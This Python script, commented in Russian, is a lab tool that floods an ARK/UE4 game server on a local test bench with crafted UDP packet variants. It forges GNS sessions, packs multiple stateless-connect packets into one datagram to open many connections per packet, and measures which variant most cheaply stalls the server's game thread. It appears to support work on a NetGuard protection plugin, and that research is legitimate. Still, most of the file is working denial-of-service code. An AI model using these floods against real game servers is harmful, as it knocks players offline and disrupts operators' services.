# -*- coding: utf-8 -*-
"""
ark_lab_gns_cost.py — доработка вектора: стоимость каждого варианта пакетов
для игрового треда сервера.

Вопросы, которые закрывает этот инструмент:
  1) СКОЛЬКО стоит серверу один пакет: мусор vs валидный GNS data-пакет
     (измеряем реальное CPU-время процесса через GetProcessTimes - это
     независимая от плагина метрика);
  2) ЧТО делает пакет дороже: размер payload, число SNP-кадров в пакете,
     число соединений (создаёт ли UE4-соединения) - то есть какой пакет
     выгоднее злоумышленнику;
  3) ПОРОГ: сколько пакетов нужно, чтобы «залип» игровой тред;
  4) УСТОЙЧИВОСТЬ: держит ли сервер просадку при низком постоянном темпе.

Метрики:
  * cpu_s   - CPU-время процесса сервера (GetProcessTimes), независимо от плагина;
  * tps     - TPS плагина NetGuard (обновляется на игровом тике);
  * tick_ms - длительность тика;
  * rtt_ms  - RTT до query-порта (поток A2S живёт отдельно от игрового).

Только локальный стенд 192.168.8.218.
"""
from __future__ import annotations

import argparse
import ctypes
import os
import socket
import statistics
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_amp import forge_session, gns_data  # noqa: E402

A2S_INFO = b"\xff\xff\xff\xffTSource Engine Query\x00"

# Полный UE4-пакет «stateless connect» (58 Б) из перехвата настоящего клиента:
#   [4 Б префикс соединения][seq][flags=0x80][тело stateless-connect]
# Здесь только тело (без префикса и без номера последовательности) - они
# подставляются при сборке пакета.
def _load_ue4_connect() -> bytes:
    """Эталонный UE4-пакет «stateless connect» - берём из захвата NetGuard.

    Это 4-й пакет первой сессии: [4 Б префикс][seq][flags=0x80][тело].
    """
    p = (r"C:\asmdata\Servers\Server2\ShooterGame\Binaries\Win64\ArkApi\Plugins"
         r"\NetGuard\NetGuard_capture.log")
    try:
        import io
        import re
        d = io.open(p, encoding="utf-8", errors="replace").read()
        conn = None
        out = []
        for m in re.finditer(r"\[pkt conn=(\S+) len=(\d+)\] ([0-9a-f]*)", d):
            c = m.group(1)
            if conn is None:
                conn = c
            if c != conn:
                break
            out.append(bytes.fromhex(m.group(3)))
            if len(out) >= 4:
                break
        if len(out) >= 4 and len(out[3]) > 40:
            return out[3]
    except Exception:  # noqa: BLE001
        pass
    return bytes.fromhex(
        "5b17b519048005001000821700010d0000003133352e3133362e362e313900"
        "7e1b000000000000ca0389b99508e742bb4a9252a13f2f55660100000100")


UE4_CONNECT_FULL = _load_ue4_connect()
# тело без 4-байтового префикса соединения, без номера последовательности и флага
UE4_CONNECT_BODY = UE4_CONNECT_FULL[6:]

# --- WinAPI: CPU-время процесса ------------------------------------------------
_k32 = ctypes.WinDLL("kernel32", use_last_error=True)
_k32.OpenProcess.restype = ctypes.c_void_p
_k32.GetProcessTimes.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                 ctypes.c_void_p, ctypes.c_void_p]


class FILETIME(ctypes.Structure):
    _fields_ = [("dwLowDateTime", ctypes.c_uint32), ("dwHighDateTime", ctypes.c_uint32)]

    def as_int(self) -> int:
        return (self.dwHighDateTime << 32) | self.dwLowDateTime


def process_cpu_seconds(pid: int) -> float:
    """Суммарное CPU-время процесса (user+kernel), секунды."""
    h = _k32.OpenProcess(0x1000, False, pid)  # PROCESS_QUERY_LIMITED_INFORMATION
    if not h:
        return 0.0
    try:
        c, e, k, u = FILETIME(), FILETIME(), FILETIME(), FILETIME()
        if not _k32.GetProcessTimes(h, ctypes.byref(e), ctypes.byref(k),
                                   ctypes.byref(u), ctypes.byref(c)):
            return 0.0
        return ((k.as_int() + u.as_int()) / 1e7)
    finally:
        _k32.CloseHandle(ctypes.c_void_p(h))


def a2s_rtt(host: str, port: int, timeout: float = 1.0) -> float | None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.perf_counter()
    try:
        s.sendto(A2S_INFO, (host, port))
        s.recvfrom(4096)
        return (time.perf_counter() - t0) * 1000.0
    except (socket.timeout, OSError):
        return None
    finally:
        s.close()


# --- варианты пакетов ---------------------------------------------------------
def gns_multi_frame(to_conn_id: int, seq: int, msg_num: int, payload: bytes,
                    frames: int) -> bytes:
    """Data-пакет с несколькими SNP-кадрами (имитация нескольких UE4-фрагментов)."""
    hdr = b"\x80" + struct.pack("<IH", to_conn_id & 0xFFFFFFFF, seq & 0xFFFF)
    out = bytearray(hdr)
    for i in range(frames):
        out += b"\x37" + struct.pack("<I", (msg_num + i) & 0xFFFFFFFF) + payload
    return bytes(out)


def build_template(name: str, to_conn_id: int) -> tuple[bytes, int]:
    """Готовит шаблон пакета (тело) один раз - чтобы отправитель не тормозил.

    Возвращает (шаблон, длина префикса, который патчится на каждом пакете).
    Патчится только UDP-заголовок: [0x80][u32 to_conn_id][u16 seq].
    """
    payload, frames, mode = VARIANTS[name]
    if mode == "junk":
        return payload, 0
    if mode == "reliable":
        if frames > 1:
            body = b"".join(
                bytes([0x40]) + (i & 0xFFFFFF).to_bytes(3, "little")
                + bytes([len(payload) & 0xFF]) + payload for i in range(frames))
        else:
            body = bytes([0x40]) + (1).to_bytes(3, "little") + bytes([len(payload) & 0xFF]) + payload
        return body, 0
    if mode == "ack":
        return b"\x90" + struct.pack("<H", 1), 0
    if mode == "blob":
        return b"\x37" + struct.pack("<I", 1) + payload, 0
    if mode == "mixed":
        return (b"\x37" + struct.pack("<I", 1) + payload
                + b"\x40" + (1).to_bytes(3, "little") + bytes([len(payload) & 0xFF]) + payload
                + b"\x90" + struct.pack("<H", 1)), 0
    if mode == "multi":
        # N полноценных UE4-пакетов (stateless connect), каждый со своим
        # номером последовательности, - в одном GNS-пакете (каждый в своём
        # SNP-кадре). Цель: N соединений сервера за один сетевой пакет.
        prefix = bytes.fromhex("5b17b519")
        out = bytearray()
        for i in range(frames):
            ue4 = prefix + bytes([(4 + i) & 0xFF, 0x80]) + payload
            out += b"\x37" + struct.pack("<I", 1 + i) + ue4
        return bytes(out), 0
    # unreliable, frames
    body = b"".join(b"\x37" + struct.pack("<I", 1 + i) + payload for i in range(frames))
    return body, 0


def gns_udp_payload(to_conn_id: int, seq: int, msg_num: int, payload: bytes) -> bytes:
    """Тот же кадр, но с флагом 0x81 (data + protobuf blob) - другой путь разбора."""
    hdr = b"\x81" + struct.pack("<IH", to_conn_id & 0xFFFFFFFF, seq & 0xFFFF)
    return hdr + b"\x37" + struct.pack("<I", msg_num & 0xFFFFFFFF) + payload


def gns_reliable(to_conn_id: int, seq: int, pos: int, payload: bytes) -> bytes:
    """Надёжный SNP-кадр (lead 0x40..0x5F): сервер ведёт учёт reliable-потока.

    Формат (по декомпиляции декодера в DLL, FUN_180018BA0):
        [0x40|size_flags][3 байта абсолютной позиции потока][1 байт размера][данные]
    size = (size_flags << 8) | байт размера.
    """
    size = len(payload)
    flags = (size >> 8) & 7
    lead = 0x40 | (flags & 7)
    hdr = b"\x80" + struct.pack("<IH", to_conn_id & 0xFFFFFFFF, seq & 0xFFFF)
    return hdr + bytes([lead]) + (pos & 0xFFFFFF).to_bytes(3, "little") + bytes([size & 0xFF]) + payload


def gns_ack(to_conn_id: int, seq: int, value: int) -> bytes:
    """ACK-кадр GNS (lead 0x90..0x9F, 16-битное значение): сервер обновляет счётчики."""
    hdr = b"\x80" + struct.pack("<IH", to_conn_id & 0xFFFFFFFF, seq & 0xFFFF)
    return hdr + b"\x90" + struct.pack("<H", value & 0xFFFF)


VARIANTS = {
    # имя              payload         frames  режим
    "junk":            (b"\x00" * 64, 0, "junk"),
    "gns-6b":          (b"\x5a" * 6, 1, "gns"),
    "gns-64b":         (b"\x5a" * 64, 1, "gns"),
    "gns-512b":        (b"\x5a" * 512, 1, "gns"),
    "gns-1400b":       (b"\x5a" * 1400, 1, "gns"),
    "gns-6b-x10":      (b"\x5a" * 6, 10, "gns"),
    "gns-64b-x10":     (b"\x5a" * 64, 10, "gns"),
    "gns-64b-x50":     (b"\x5a" * 64, 50, "gns"),
    "ue4-6b":          (bytes.fromhex("5b17b519") + bytes.fromhex("0140"), 1, "gns"),
    "ue4-62b":         (bytes.fromhex("5b17b519") + bytes.fromhex(
        "048005001000821700010d0000003133352e3133362e362e3139007e1b000000000000ca0389b9950"
        "8e742bb4a9252a13f2f5566010000010001"), 1, "gns"),
    "ue4-62b-x10":     (bytes.fromhex("5b17b519") + bytes.fromhex(
        "048005001000821700010d0000003133352e3133362e362e3139007e1b000000000000ca0389b9950"
        "8e742bb4a9252a13f2f5566010000010001"), 10, "gns"),
    "gns-64b-blob":    (b"\x5a" * 64, 1, "blob"),
    "gns-reliable":    (b"\x5a" * 64, 1, "reliable"),
    "gns-reliable-x10": (b"\x5a" * 64, 10, "reliable"),
    "gns-ack":         (b"", 1, "ack"),
    "gns-mixed":       (b"\x5a" * 64, 1, "mixed"),
    # N полноценных UE4-пакетов (stateless connect) в одном GNS-пакете,
    # каждый со своим номером последовательности -> N соединений за 1 сетевой пакет
    "ue4-multi4":      (UE4_CONNECT_BODY, 4, "multi"),
    "ue4-multi10":     (UE4_CONNECT_BODY, 10, "multi"),
    "ue4-multi20":     (UE4_CONNECT_BODY, 20, "multi"),
}


def run_variant(host, game_port, query_port, m, pid, name, count, seconds,
                rate: float = 0.0) -> dict:
    payload, frames, mode = VARIANTS[name]
    cpu0 = process_cpu_seconds(pid)
    tps0 = float(m.status().get("tps") or 0.0)
    att0 = int(m.status().get("connectionAttempts") or 0)
    sock = None
    sent = 0
    t0 = time.time()
    rtts: list[float | None] = []
    tps_samples: list[float] = []
    interval = 1.0 / rate if rate > 0 else 0.0
    next_t = t0

    def sample() -> None:
        rtts.append(a2s_rtt(host, query_port))
        try:
            tps_samples.append(float(m.status().get("tps") or 0.0))
        except Exception:  # noqa: BLE001
            tps_samples.append(0.0)

    if mode == "junk":
        socks = []
        for _ in range(4):
            sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
            sk.bind(("0.0.0.0", 0))
            socks.append(sk)
        while time.time() - t0 < seconds and sent < count:
            now = time.time()
            if interval:
                if now < next_t:
                    time.sleep(min(next_t - now, 0.05))
                    next_t += interval
            for sk in socks:
                for _ in range(500):
                    try:
                        sk.sendto(payload, (host, game_port))
                    except OSError:
                        pass
                    sent += 1
            sample()
        for sk in socks:
            sk.close()
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3.0)
        sock.bind(("0.0.0.0", 0))
        srv = forge_session(host, game_port, sock, verbose=False)
        # шаблон пакета строится один раз -> отправитель не упирается в Python
        body_tpl = build_template(name, srv)[0]
        hdr_tpl = b"\x80" + struct.pack("<IH", srv & 0xFFFFFFFF, 0)
        while time.time() - t0 < seconds and sent < count:
            now = time.time()
            if interval:
                if now < next_t:
                    time.sleep(min(next_t - now, 0.05))
                    next_t += interval
            for _ in range(1000):
                if sent >= count:
                    break
                pkt = hdr_tpl[:5] + struct.pack("<H", (sent + 1) & 0xFFFF) + body_tpl
                try:
                    sock.sendto(pkt, (host, game_port))
                except OSError:
                    pass
                sent += 1
            sample()
        sock.close()
    dt = max(1e-6, time.time() - t0)
    cpu1 = process_cpu_seconds(pid)
    st = m.status()
    att1 = int(st.get("connectionAttempts") or 0)
    rtt_ok = [r for r in rtts if r is not None]
    return {
        "variant": name, "packets": sent, "seconds": round(dt, 1),
        "pps": round(sent / dt),
        "cpu_s": round(cpu1 - cpu0, 2),
        "us_per_packet": round((cpu1 - cpu0) * 1e6 / max(1, sent), 2),
        "tps0": tps0, "tps_min": min(tps_samples) if tps_samples else 0.0,
        "tps_avg": round(statistics.mean(tps_samples), 1) if tps_samples else 0.0,
        "tps_after": float(st.get("tps") or 0.0),
        "rtt_max": round(max(rtt_ok), 1) if rtt_ok else None,
        "rtt_lost": len(rtts) - len(rtt_ok),
        "conn_delta": att1 - att0,
    }


def main() -> int:
    ap = argparse.ArgumentParser(description="Стоимость вариантов пакетов для игрового треда")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--query-port", type=int, default=27016)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--pid", type=int, default=0, help="PID сервера (0 = взять из плагина)")
    ap.add_argument("--count", type=int, default=100000)
    ap.add_argument("--seconds", type=float, default=10.0)
    ap.add_argument("--only", action="append", choices=sorted(VARIANTS))
    ap.add_argument("--rate", type=float, default=0.0, help="ограничить темп, пакетов/с (0 = максимум)")
    ap.add_argument("--sweep", default="", help="свип по темпу: 'вариант:rate1,rate2,...'")
    ap.add_argument("--cooldown", type=float, default=20.0)
    ap.add_argument("--json", default="")
    args = ap.parse_args()

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    pid = args.pid or int(m.status().get("pid") or 0)
    if not pid:
        print("не удалось определить PID сервера")
        return 1

    results = []
    if args.sweep:
        # свип: для каждого темпа - отдельный замер
        name, rates = args.sweep.split(":")
        for rate in [float(x) for x in rates.split(",")]:
            while True:
                tps = float(m.status().get("tps") or 0.0)
                if tps >= 19.0:
                    break
                time.sleep(2.0)
            r = run_variant(args.host, args.game_port, args.query_port, m, pid, name,
                            10 ** 9, args.seconds, rate=rate)
            r["variant"] = "%s@%d pps" % (name, int(rate))
            r["rate"] = rate
            results.append(r)
            print("  %-22s пакетов=%-7d CPU=%6.2f с (%5.1f мкс/пакет)  TPS %s->%s (мин %s, сред %s)  соединений %+d" % (
                r["variant"], r["packets"], r["cpu_s"], r["us_per_packet"], r["tps0"],
                r["tps_after"], r["tps_min"], r["tps_avg"], r["conn_delta"]))
            time.sleep(args.cooldown)
    else:
        names = args.only or list(VARIANTS)
        print("сервер: pid=%d, вариантов: %d, пакетов на вариант: %d" % (pid, len(names), args.count))
        for name in names:
            while True:
                tps = float(m.status().get("tps") or 0.0)
                if tps >= 19.0:
                    break
                time.sleep(2.0)
            r = run_variant(args.host, args.game_port, args.query_port, m, pid, name,
                            args.count, args.seconds, rate=args.rate)
            results.append(r)
            print("  %-16s пакетов=%-7d CPU=%6.2f с (%5.1f мкс/пакет)  TPS %s->%s (мин %s)  RTT макс %s  соединений %+d" % (
                name, r["packets"], r["cpu_s"], r["us_per_packet"], r["tps0"], r["tps_after"],
                r["tps_min"], r["rtt_max"], r["conn_delta"]))
            time.sleep(args.cooldown)

    print()
    print("=" * 118)
    print("СТОИМОСТЬ ПАКЕТОВ ДЛЯ ИГРОВОГО ТРЕДА (локальный стенд Server2)")
    print("=" * 118)
    print("%-16s %8s %8s %9s %13s %9s %9s %9s" % (
        "вариант", "пакетов", "pps", "CPU, с", "мкс/пакет", "TPS было", "TPS мин", "соединений"))
    for r in results:
        print("%-16s %8d %8d %9.2f %13.1f %9s %9s %9d" % (
            r["variant"], r["packets"], r["pps"], r["cpu_s"], r["us_per_packet"],
            r["tps0"], r["tps_min"], r["conn_delta"]))
    print("-" * 118)
    print("мкс/пакет - реальная стоимость обработки одного пакета игровым тредом (CPU процесса).")
    print("=" * 118)
    if args.json:
        import json
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print("сохранено: %s" % args.json)
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
